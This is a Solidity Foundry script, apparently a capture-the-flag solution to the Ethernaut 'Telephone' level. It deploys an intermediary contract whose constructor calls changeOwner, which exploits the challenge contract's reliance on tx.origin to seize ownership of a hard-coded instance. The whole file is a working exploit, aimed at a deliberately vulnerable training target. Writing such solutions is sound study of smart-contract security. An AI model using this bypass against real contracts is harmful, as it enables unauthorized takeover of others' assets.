// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Telephone} from "../../src/Telephone/Telephone.sol";
import {Script} from "../../lib/forge-std/src/Script.sol";
import {console} from "../../lib/forge-std/src/console.sol";

contract IntermediaryContract {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(0xda2b2F9aB98c616708B9c855f1f1096759cD9E76);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new IntermediaryContract(
            telephoneInstance, vm.envAddress("MY_ADDRESS")
        );
        
        vm.stopBroadcast();
    }
}
